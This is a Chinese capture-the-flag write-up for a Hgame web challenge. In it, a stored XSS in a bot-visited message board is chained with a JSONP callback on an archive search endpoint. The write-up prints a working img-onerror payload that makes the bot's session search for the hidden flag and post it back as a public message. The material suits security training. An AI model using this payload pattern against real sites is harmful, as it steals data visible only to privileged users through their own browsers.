# 博丽神社的绘马挂

## 题目简述

题面是灵梦设置绘马挂供人许愿，紫在归档绘马里藏了秘密，flag 格式为 `Hgame{...}`；只有在线靶机，没有附件源码。服务包含登录/自动注册、公开留言、呼叫灵梦访问留言、以及归档搜索功能。现有题解记录中，留言内容可进入 bot 浏览环境，归档搜索接口支持 JSONP callback，并且归档中存在只有特定身份能查到的秘密内容。

## 解题过程

登录后服务会自动注册并下发普通用户身份。留言内容会被 bot 访问，简单测试即可确认留言处存在存储型 XSS。题目描述强调“归档绘马”，所以重点不是当前公开留言，而是归档搜索接口。

归档搜索支持 JSONP callback。让灵梦访问恶意留言后，payload 在灵梦的同源身份下请求归档搜索，查询包含 `Hgame` 的内容；拿到结果后再把内容写回公开留言，或者转发到自己的接收端。写回留言的最小 payload 如下：

```javascript
<img src=x style="display:none" onerror="
window.k = function(d) {
  if (!d.results) return;
  for (const item of d.results) {
    const c = item.content || '';
    if (c.includes('Hgame')) {
      fetch('/api/messages', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: '[FLAG] ' + c, is_private: false})
      });
      break;
    }
  }
};
const s = document.createElement('script');
s.src = '/api/search?q=Hgame&callback=window.k';
document.body.appendChild(s);
">
```

## 方法总结

有 bot 的留言板题要同时检查存储型 XSS、JSONP/callback、跨接口鉴权继承和 bot 可访问的数据范围。若目标数据只对 bot/管理员可见，payload 应让受害者浏览器在同源权限下查询并回传，而不是试图用自己的账号直接读取。
